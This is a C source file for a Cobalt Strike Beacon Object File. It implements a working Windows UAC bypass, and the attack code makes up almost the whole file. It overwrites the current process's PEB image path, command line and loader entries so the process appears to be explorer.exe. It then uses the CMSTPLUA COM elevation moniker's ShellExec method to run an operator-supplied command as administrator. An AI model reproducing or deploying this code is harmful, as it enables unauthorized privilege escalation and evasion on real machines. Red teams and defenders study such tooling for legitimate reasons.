/**
 * This is a Cobalt Strike (CS) Beacon Object File (BOF) 
 * which exploits the CMSTPLUA COM interface. It masquerade 
 * the PEB of the current process to a Windows process, and 
 * then utilises COM Elevation Moniker on the CMSTPLUA COM 
 * object in order to execute commands in an elevated 
 * context.
 * 
 * Author:
 *  - Tijme Gommers (github.com/tijme, twitter.com/tijme)
 * 
 * Credits:
 *  - Alex (github.com/lldre)
 *    Thanks for teaching me all of this Alex!
 */

 /**
 * Standard Input Output.
 * 
 * Defines three variable types, several macros, and various functions for performing input and output.
 * https://www.tutorialspoint.com/c_standard_library/stdio_h.htm
 */
#include <stdio.h>

/**
 * Standard Library.
 * 
 * Defines four variable types, several macros, and various functions for performing general functions.
 * https://www.tutorialspoint.com/c_standard_library/stdlib_h.htm
 */
#include <stdlib.h>

/**
 * Data type limits.
 * 
 * The macros defined in this header, limits the values of various variable types like char, int and long.
 * https://www.tutorialspoint.com/c_standard_library/limits_h.htm
 */
#include <limits.h>

/**
 * Strings.
 * 
 * Defines one variable type, one macro, and various functions for manipulating arrays of characters.
 * https://www.tutorialspoint.com/c_standard_library/string_h.htm
 */
#include <string.h>

/**
 * Integers.
 * 
 * Defines macros that specify limits of integer types corresponding to types defined in other standard headers.
 * https://pubs.opengroup.org/onlinepubs/009696899/basedefs/stdint.h.html
 */
#include <stdint.h>

/**
 * Booleans.
 * 
 * Defines boolean types.
 * https://pubs.opengroup.org/onlinepubs/007904975/basedefs/stdbool.h.html
 */
#include <stdbool.h>

/**
 * Windows API.
 * 
 * Contains declarations for all of the functions, macro's & data types in the Windows API.
 * https://docs.microsoft.com/en-us/previous-versions//aa383749(v=vs.85)?redirectedfrom=MSDN
 */
#include <windows.h>

/**
 * Process Threads API
 * 
 * API set defining threading functions, helpers, etc.
 * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/
 */
#include <processthreadsapi.h>

/**
 * User Environment
 * 
 * Header file for user environment API. User Profiles, environment variables, and Group Policy.
 * https://learn.microsoft.com/en-us/windows/win32/api/userenv/
 */
#include <userenv.h>

/**
 * Remote Desktop Services
 * 
 * Windows Terminal Server public APIs.
 * https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/
 */
#include <wtsapi32.h>

/**
 * Tool Help Library
 * 
 * WIN32 tool help functions, types, and definitions.
 * https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/
 */
#include <tlhelp32.h>

/**
 * Windows User
 * 
 * USER procedure declarations, constant definitions and macros
 * https://learn.microsoft.com/en-us/windows/win32/api/winuser/
 */
#include <winuser.h>

/**
 * Internal NT API's and data structures.
 * 
 * Helper library that contains NT API's and data structures for system services, security and identity.
 * https://docs.microsoft.com/en-us/windows/win32/api/winternl/
 */
#include <winternl.h>

/**
 * Windows Update Agent API
 * 
 * https://docs.microsoft.com/en-us/windows/win32/api/wuapi/
 */
#define COBJMACROS
#include <wuapi.h>

/**
 * Load custom header files.
 */
#include "headers/imports.h"
#include "headers/beacon.h"

/**
 * Dynamically include Windows libraries
 */
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "ntoskrnl.lib")

/**
 * If debug is enabled
 */
#ifndef DEBUG
    #define DEBUG 0
#endif

/**
 * ICMLuaUtil VTBL interface
 */
typedef interface ICMLuaUtil ICMLuaUtil;
typedef struct ICMLuaUtilVtbl {
    BEGIN_INTERFACE
    HRESULT(STDMETHODCALLTYPE* QueryInterface) (__RPC__in ICMLuaUtil* This, __RPC__in REFIID riid, _COM_Outptr_  void** ppvObject);
    ULONG(STDMETHODCALLTYPE* AddRef) (__RPC__in ICMLuaUtil* This);
    ULONG(STDMETHODCALLTYPE* Release) ( __RPC__in ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* Method1) (__RPC__in ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* Method2) (__RPC__in ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* Method3) (__RPC__in ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* Method4) (__RPC__in ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* Method5) (__RPC__in ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* Method6) (__RPC__in ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* ShellExec) (__RPC__in ICMLuaUtil* This, _In_ LPCTSTR lpFile, _In_opt_ LPCTSTR lpParameters, _In_opt_ LPCTSTR lpDirectory, _In_ ULONG fMask, _In_ ULONG nShow);
    END_INTERFACE
} *PICMLuaUtilVtbl;

/**
 * Define ICMLuaUtil interface with ICMLuaUtil VTBL
 */
interface ICMLuaUtil {
    CONST_VTBL struct ICMLuaUtilVtbl *lpVtbl;
};

/**
 * Define cross-compatible print methods
 */
#ifdef BOF
    #define PRINT(...) { \
        BeaconPrintf(CALLBACK_OUTPUT, __VA_ARGS__); \
    }
#else
    #define PRINT(...) { \
        fprintf(stdout, "[+] "); \
        fprintf(stdout, __VA_ARGS__); \
        fprintf(stdout, "\n"); \
    }
#endif

#ifdef BOF
    #define PRINT_ERROR(...) { \
        BeaconPrintf(CALLBACK_ERROR, __VA_ARGS__); \
    }
#else
    #define PRINT_ERROR(...) { \
        fprintf(stdout, "[!] "); \
        fprintf(stdout, __VA_ARGS__); \
        fprintf(stdout, "\n"); \
    }
#endif

#ifdef BOF
    #define PRINT_DEBUG(...) { \
        if (DEBUG) { \
            BeaconPrintf(CALLBACK_OUTPUT, __VA_ARGS__); \
        } \
    }
#else
    #define PRINT_DEBUG(...) { \
        if (DEBUG) { \
            fprintf(stdout, "[i] "); \
            fprintf(stdout, __VA_ARGS__); \
            fprintf(stdout, "\n"); \
        } \
    }
#endif

/**
 * Get current Process Environment Block.
 *
 * @return PEB* The current PEB.
 */
void* NtGetPeb() {
    #ifdef _M_X64
        return (void*) __readgsqword(0x60);
    #elif _M_IX86
        return (void*) __readfsdword(0x30);
    #else
        #error "This architecture is currently unsupported"
    #endif
}

/**
 * Masquerade the current PEB to look like 'explorer.exe'.
 *
 * @return int Zero if succesfully executed, any other integer otherwise.
 */
int masqueradePEB() {
    PRINT_DEBUG("\t- Defining local structs.");

    /**
     * Define local PEB LDR DATA
     */
    typedef struct _PEB_LDR_DATA {
        ULONG Length;
        BOOLEAN Initialized;
        HANDLE SsHandle;
        LIST_ENTRY InLoadOrderModuleList;
        LIST_ENTRY InMemoryOrderModuleList;
        LIST_ENTRY InInitializationOrderModuleList;
        PVOID EntryInProgress;
        BOOLEAN ShutdownInProgress;
        HANDLE ShutdownThreadId;
    } PEB_LDR_DATA, * PPEB_LDR_DATA;

  
    /**
     * Define local RTL USER PROCESS PARAMETERS
     */
    typedef struct _RTL_USER_PROCESS_PARAMETERS {
        BYTE           Reserved1[16];
        PVOID          Reserved2[10];
        UNICODE_STRING ImagePathName;
        UNICODE_STRING CommandLine;
    } RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

    /**
     * Define partial local PEB
     */
    typedef struct _PEB {
        BOOLEAN InheritedAddressSpace;
        BOOLEAN ReadImageFileExecOptions;
        BOOLEAN BeingDebugged;
        union
        {
            BOOLEAN BitField;
            struct
            {
                BOOLEAN ImageUsesLargePages : 1;
                BOOLEAN IsProtectedProcess : 1;
                BOOLEAN IsLegacyProcess : 1;
                BOOLEAN IsImageDynamicallyRelocated : 1;
                BOOLEAN SkipPatchingUser32Forwarders : 1;
                BOOLEAN SpareBits : 3;
            };
        };
        HANDLE Mutant;

        PVOID ImageBaseAddress;
        PPEB_LDR_DATA Ldr;
        PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
        PVOID SubSystemData;
        PVOID ProcessHeap;
        PRTL_CRITICAL_SECTION FastPebLock;
    } PEB, * PPEB;

    /**
     * Define local LDR DATA TABLE ENTRY
     */
    typedef struct _LDR_DATA_TABLE_ENTRY {
        LIST_ENTRY InLoadOrderLinks;
        LIST_ENTRY InMemoryOrderLinks;
        union
        {
            LIST_ENTRY InInitializationOrderLinks;
            LIST_ENTRY InProgressLinks;
        };
        PVOID DllBase;
        PVOID EntryPoint;
        ULONG SizeOfImage;
        UNICODE_STRING FullDllName;
        UNICODE_STRING BaseDllName;
        ULONG Flags;
        WORD LoadCount;
        WORD TlsIndex;
        union
        {
            LIST_ENTRY HashLinks;
            struct
            {
                PVOID SectionPointer;
                ULONG CheckSum;
            };
        };
        union
        {
            ULONG TimeDateStamp;
            PVOID LoadedImports;
        };
    } LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

    typedef NTSTATUS(NTAPI* _RtlEnterCriticalSection) (PRTL_CRITICAL_SECTION CriticalSection);
    typedef NTSTATUS(NTAPI* _RtlLeaveCriticalSection) (PRTL_CRITICAL_SECTION CriticalSection);
    typedef void (WINAPI* _RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);

    _RtlEnterCriticalSection RtlEnterCriticalSection = (_RtlEnterCriticalSection) GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlEnterCriticalSection");
    if (RtlEnterCriticalSection == NULL) {
        PRINT_ERROR("Could not find RtlEnterCriticalSection.");
        return 1;
    }

    _RtlLeaveCriticalSection RtlLeaveCriticalSection = (_RtlLeaveCriticalSection) GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlLeaveCriticalSection");
    if (RtlLeaveCriticalSection == NULL) {
        PRINT_ERROR("Could not find RtlLeaveCriticalSection.");
        return 1;
    }

    _RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString) GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlInitUnicodeString");
    if (RtlInitUnicodeString == NULL) {
        PRINT_ERROR("Could not find RtlInitUnicodeString.");
        return 1;
    }

    PRINT_DEBUG("\t- Getting 'explorer.exe' path.");
    WCHAR chExplorerPath[MAX_PATH];
    GetWindowsDirectoryW(chExplorerPath, MAX_PATH);
    wcscat_s(chExplorerPath, sizeof(chExplorerPath) / sizeof(wchar_t), L"\\explorer.exe");
    LPWSTR pwExplorerPath = (LPWSTR) malloc(MAX_PATH);
    wcscpy_s(pwExplorerPath, MAX_PATH, chExplorerPath);

    PRINT_DEBUG("\t- Getting current PEB.");
    PEB* peb = (PEB*) NtGetPeb();

    RtlEnterCriticalSection(peb->FastPebLock);

    PRINT_DEBUG("\t- Masquerading ImagePathName and CommandLine.");

    RtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, chExplorerPath);
    RtlInitUnicodeString(&peb->ProcessParameters->CommandLine, chExplorerPath);

    PLDR_DATA_TABLE_ENTRY pStartModuleInfo = (PLDR_DATA_TABLE_ENTRY) peb->Ldr->InLoadOrderModuleList.Flink;
    PLDR_DATA_TABLE_ENTRY pNextModuleInfo = (PLDR_DATA_TABLE_ENTRY) peb->Ldr->InLoadOrderModuleList.Flink;

    WCHAR wExeFileName[MAX_PATH];
    GetModuleFileNameW(NULL, wExeFileName, MAX_PATH);

    do {
        if (_wcsicmp(wExeFileName, pNextModuleInfo->FullDllName.Buffer) == 0) {
            PRINT_DEBUG("\t- Masquerading FullDllName and BaseDllName.");
            RtlInitUnicodeString(&pNextModuleInfo->FullDllName, pwExplorerPath);
            RtlInitUnicodeString(&pNextModuleInfo->BaseDllName, pwExplorerPath);
            break;
        }

        pNextModuleInfo = (PLDR_DATA_TABLE_ENTRY) pNextModuleInfo->InLoadOrderLinks.Flink;
    } while (pNextModuleInfo != pStartModuleInfo);

    RtlLeaveCriticalSection(peb->FastPebLock);
    return 0;
}

/**
 * Convert Com Object HRESULT to string representation.
 * 
 * @param HRESULT result The Com Object result.
 * @return char* The string representation.
 */
char* StringFromResult(HRESULT result) {
    char* message = calloc(100, sizeof(char));

    if (FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, result, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), message, 100, NULL) == 0) {
        message = "UNKNOWN";
        return message;
    }

    return message;
}

/**
 * Invoke COM object elevation and command execution.
 *
 * @param char* file The file to execute.
 * @param char* parameters The arguments to pass to the file.
 * @return int Zero if succesfully executed, any other integer otherwise.
 */
int invokeComElevation(char* file, char* parameters) {
    HRESULT hResult = E_FAIL;
    ICMLuaUtil* pICMLuaUtil = NULL;

    do {
        PRINT_DEBUG("\t- IIDFromString.");
        IID hIID_ICMLuaUtil;
        if (IIDFromString(L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}", &hIID_ICMLuaUtil) != S_OK) {
            PRINT_ERROR("Could not get IID from ICMLuaUtil GUID.");
            break;
        }

        PRINT_DEBUG("\t- Initializing BIND_OPTS3.");
        BIND_OPTS3 hBindOpts;
        memset(&hBindOpts, 0, sizeof(hBindOpts));

        hBindOpts.cbStruct = sizeof(hBindOpts);
        hBindOpts.dwClassContext = CLSCTX_LOCAL_SERVER;

        PRINT_DEBUG("\t- CoInitialize.");
        CoInitialize(NULL);

        PRINT_DEBUG("\t- CoGetObject.");
        hResult = CoGetObject(L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}", (BIND_OPTS*) &hBindOpts, &hIID_ICMLuaUtil, (void**) &pICMLuaUtil);
        if (hResult != S_OK) {
            PRINT_ERROR("\t- Could not perform CoGetObject: %x, %s.\n", hResult, StringFromResult(hResult));
            break;
        }

        wchar_t* wFile =calloc(strlen(file), sizeof(wchar_t));
        mbstowcs(wFile, file, strlen(file));

        wchar_t* wParameters = NULL;
        if (parameters != NULL) {
            wParameters = calloc(strlen(parameters), sizeof(wchar_t));
            mbstowcs(wParameters, parameters, strlen(parameters));
        }

        hResult = pICMLuaUtil->lpVtbl->ShellExec(pICMLuaUtil, (LPCSTR) wFile, (LPCSTR) wParameters, NULL, SEE_MASK_DEFAULT, SW_SHOW);
        if (hResult != S_OK) {
            PRINT_ERROR("\t- Could not perform ShellExec.");
            break;
        }

        PRINT_DEBUG("\t- Succesfully executed shell.");
    } while (false);

    if (pICMLuaUtil != NULL) {
        pICMLuaUtil->lpVtbl->Release(pICMLuaUtil);
    }

    return hResult;
}

/**
 * Perform the UAC bypass.
 *
 * @param char* file The file to execute.
 * @param char* parameters The arguments to pass to the file.
 * @return int Zero if succesfully executed, any other integer otherwise.
 */
int boot(char* file, char* parameters) {
    if (file == NULL) {
        PRINT_ERROR("No file given.");
        return 1;
    }

    PRINT("Command: %s %s", file, parameters);

    PRINT("Masquerading PEB.");
    if (masqueradePEB() != 0) {
        PRINT_ERROR("Could not masquerade PEB.");
        return 1;
    }

    PRINT("Invoking COM elevation.");
    if (invokeComElevation(file, parameters) != 0) {
        PRINT_ERROR("Could not invoke UAC bypass.");
        return 1;
    }

    PRINT("Done!");
    return 0;
}

#ifdef BOF
    /**
     * CS BOF entry point.
     * 
     * The Cobalt Strike (CS) Beacon Object File (BOF) entry point.
     * 
     * @param char* args The array of arguments.
     * @param int length The length of the array of arguments.
     */
    void go(char* args, int length) {
        datap parser;

        BeaconDataParse(&parser, args, length);

        char* file = BeaconDataExtract(&parser, NULL);
        char* parameters = BeaconDataExtract(&parser, NULL);

        boot(file, parameters);
    }
#else
    /**
     * Test the UAC bypass code
     *
     * @param int argc Amount of arguments in argv.
     * @param char** Array of arguments passed to the program.
     * @return int Zero if succesfully executed, any other integer otherwise.
     */
    int main(int argc, char** argv) {
        size_t index = 2;
        size_t length = 0;
        
        while (argv[index] != NULL) {
            if (index > 2) length += 1; // Add a space between arguments
            length += strlen(argv[index]);
            index ++;
        }

        index = 2;
        char* parameters = calloc(length + 1, sizeof(char));
        while (argv[index] != NULL) {
            if (index > 2) strcat(parameters, " "); // Add a space between arguments
            strcat(parameters, argv[index]);
            index ++;
        }

        return boot(argv[1], parameters);
    }
#endif
